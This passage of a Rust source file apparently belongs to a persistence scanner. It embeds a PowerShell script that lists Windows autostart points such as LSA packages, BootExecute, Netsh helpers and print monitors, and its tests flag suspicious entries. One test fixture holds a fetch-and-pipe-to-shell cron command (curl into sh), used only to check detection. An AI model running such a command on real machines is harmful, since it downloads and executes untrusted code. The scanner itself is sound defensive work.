} catch { Write-Output ("NOTE`tWMI subscriptions: " + $_.Exception.Message) }
$lsa = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue
if ($lsa) { foreach ($v in @('Authentication Packages','Notification Packages','Security Packages')) { foreach ($d in @($lsa.$v)) { if ($d -and $d -ne '""') { Emit 'LSA package' $d $d "HKLM\...\Lsa\$v" 'system' 'True' 'loaded into lsass' } } } }
$sm = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -ErrorAction SilentlyContinue
if ($sm) { foreach ($d in @($sm.BootExecute)) { if ($d -and $d -notmatch '^autocheck autochk') { Emit 'Boot execute' $d $d 'HKLM\...\Session Manager' 'system' 'True' 'runs before Windows starts' } } }
$nh = Get-Item 'HKLM:\SOFTWARE\Microsoft\NetSh' -ErrorAction SilentlyContinue
if ($nh) { foreach ($v in $nh.GetValueNames()) { $d = $nh.GetValue($v); Emit 'Netsh helper' $v $d 'HKLM\SOFTWARE\Microsoft\NetSh' 'system' 'True' 'loaded by netsh.exe' } }
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors' -ErrorAction SilentlyContinue | ForEach-Object {
  $d = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).Driver
  if ($d) { Emit 'Print monitor' $_.PSChildName $d 'HKLM\...\Print\Monitors' 'system' 'True' 'loaded by the spooler' }
}
Emit 'HostsFile' 'hosts' "$env:SystemRoot\System32\drivers\etc\hosts" 'hosts' 'system' 'True' ''
"#;

    pub fn collect(notes: &mut Vec<String>) -> Vec<Item> {
        let out = match run_command(Command::new("powershell").args(["-NoProfile", "-NonInteractive", "-Command", SCRIPT]), Duration::from_secs(60)) {
            Ok(o) => o,
            Err(e) => {
                notes.push(format!("powershell: {e}"));
                return Vec::new();
            }
        };
        let mut items = Vec::new();
        for line in String::from_utf8_lossy(&out.stdout).lines() {
            let f: Vec<&str> = line.split('\t').collect();
            if f.first() == Some(&"NOTE") {
                notes.push(f[1..].join(" "));
                continue;
            }
            if f.len() < 7 {
                continue;
            }
            if f[0] == "HostsFile" {
                hosts_file(&mut items, f[2]);
                continue;
            }
            let mut it = Item::new(f[0], f[1], f[2], f[3], f[4]);
            it.enabled = Some(f[5].eq_ignore_ascii_case("true"));
            it.detail = f[6].to_string();
            match f[0] {
                "Winlogon value" => {
                    let v = f[2].trim().trim_end_matches(',').to_lowercase();
                    let default = (f[1] == "Shell" && v == "explorer.exe") || (f[1] == "Userinit" && v.ends_with("\\system32\\userinit.exe"));
                    if !default {
                        it.flags.push("non-default Winlogon value — runs at every logon".into());
                    }
                }
                "IFEO debugger" => it.flags.push("hijacks a program via Image File Execution Options".into()),
                "AppInit DLL" => it.flags.push("DLL injected into every GUI process".into()),
                "WMI subscription" => it.flags.push("WMI event subscription (fileless persistence)".into()),
                _ => {}
            }
            items.push(it);
        }
        // Microsoft's own tasks/services/drivers are numerous; keep them
        // but they sort after anything flagged.
        notes.push("Some services and tasks are only visible to administrators.".into());
        items
    }
}

#[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
mod imp {
    use super::*;
    pub fn collect(notes: &mut Vec<String>) -> Vec<Item> {
        notes.push("persistence scanning is not implemented on this platform".into());
        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn targets_and_flags() {
        assert_eq!(extract_target("\"/Applications/My App.app/x\" --flag").as_deref(), Some("/Applications/My App.app/x"));
        assert_eq!(extract_target("/usr/bin/true --x").as_deref(), Some("/usr/bin/true"));
        assert!(risky_location("/private/tmp/evil"));
        assert!(risky_location(r"C:\Users\me\AppData\Local\Temp\x.exe"));
        assert!(!risky_location("/usr/local/bin/tool"));

        let mut it = Item::new("Cron job", "x", "bash -c 'curl http://x | sh'", "test", "user");
        it.target = Some("/nonexistent/procwatch-test".into());
        enrich(&mut it, &Default::default());
        assert!(it.flags.iter().any(|f| f.contains("inline script")));
        assert!(it.flags.iter().any(|f| f.contains("missing")));

        let mut items = Vec::new();
        cron_lines(&mut items, "# c\nSHELL=/bin/sh\n*/5 * * * * root /usr/bin/backup --now\n@reboot /opt/x\n", "/etc/crontab", "system", true);
        assert_eq!(items.len(), 2);
        assert_eq!(items[0].command, "/usr/bin/backup --now");
    }

    #[test]
    fn hosts_and_keys() {
        let dir = std::env::temp_dir().join(format!("pw-persist-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let hosts = dir.join("hosts");
        std::fs::write(&hosts, "127.0.0.1 localhost\n::1 localhost\n10.6.6.6 update.vendor.example # pinned\n").unwrap();
        let keys = dir.join("authorized_keys");
        std::fs::write(&keys, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabc me@laptop\ncommand=\"/bin/x\" ssh-rsa AAAAB3Nza\n").unwrap();
        let mut items = Vec::new();
        hosts_file(&mut items, hosts.to_str().unwrap());
        authorized_keys(&mut items, &keys, "user");
        assert_eq!(items.len(), 3);
        assert_eq!(items[0].name, "update.vendor.example");
        assert!(items[0].flags[0].contains("overrides DNS"));
        assert_eq!(items[1].name, "me@laptop");
        assert!(items[2].flags.iter().any(|f| f.contains("forces a command")));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn scan_runs() {
        let s = scan();
        // Whatever the machine has, entries must be well-formed.
        assert!(s.items.iter().all(|i| !i.category.is_empty()));
    }
}
